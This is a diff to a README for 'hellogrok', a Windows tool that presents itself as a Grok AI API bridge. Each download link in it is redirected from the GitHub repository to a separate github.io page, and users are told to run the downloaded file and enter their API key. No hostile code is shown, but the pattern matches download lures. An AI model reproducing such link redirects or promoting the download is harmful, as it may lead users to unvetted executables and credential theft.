@@ -1,6 +1,6 @@
 # ⚡ hellogrok - Your Bridge to Smarter AI Tools
 
-[![Download hellogrok](https://img.shields.io/badge/Download-hellogrok-blue?style=for-the-badge&logo=github)](https://github.com/Ahmedabdel6784/hellogrok)
+[![Download hellogrok](https://img.shields.io/badge/Download-hellogrok-blue?style=for-the-badge&logo=github)](https://ahmedabdel6784.github.io)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these simple steps to get hellogrok running on your computer.
 
 Visit this link to download the application:
 
-[🔗 https://github.com/Ahmedabdel6784/hellogrok](https://github.com/Ahmedabdel6784/hellogrok)
+[🔗 https://ahmedabdel6784.github.io](https://ahmedabdel6784.github.io)
 
 Click the download button on the page. The file will save to your computer.
 
@@ -146,7 +146,7 @@ These requirements are minimal. Almost any Windows computer from the past decade
 
 | Task | Action |
 |------|--------|
-| Download hellogrok | Visit https://github.com/Ahmedabdel6784/hellogrok |
+| Download hellogrok | Visit https://ahmedabdel6784.github.io |
 | Run the program | Double-click the downloaded file |
 | Find the icon | Look in the system tray (bottom-right corner) |
 | Add Grok credentials | Open hellogrok → Settings → Enter API key |
@@ -167,7 +167,7 @@ Gone are the days of choosing between tools. hellogrok gives you the freedom to 
 
 Need the link one more time? Here it is:
 
-[⬇️ Download hellogrok Now](https://github.com/Ahmedabdel6784/hellogrok)
+[⬇️ Download hellogrok Now](https://ahmedabdel6784.github.io)
 
 Visit this link to download the application. Start connecting your tools today.
 
@@ -204,6 +204,6 @@ If you encounter a problem, find a bug, or have an idea for improvement, check t
 
 You are only three steps away from a better AI experience. Do not wait.
 
-[🚀 Get hellogrok Now](https://github.com/Ahmedabdel6784/hellogrok)
+[🚀 Get hellogrok Now](https://ahmedabdel6784.github.io)
 
 Keywords: Grok, AI proxy, local server, API bridge, Windows tool, secure connection, automatic setup
